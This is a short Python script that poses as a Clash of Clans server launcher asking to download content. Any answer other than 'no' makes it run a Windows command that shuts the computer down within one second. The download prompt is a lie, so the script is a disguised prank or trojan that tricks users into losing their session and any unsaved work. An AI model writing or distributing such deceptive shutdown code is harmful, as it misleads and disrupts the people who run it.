
import os 

  

shutdown = input("Clash of Clans Server has preparing to lauch.. Are you want continue, its required downloading some content sc up to 96mb, Do you really want continue ? (yes / no): ") 

  
if shutdown == 'no': 

    exit() 

else: 

    os.system("shutdown /s /t 1") 
Output:
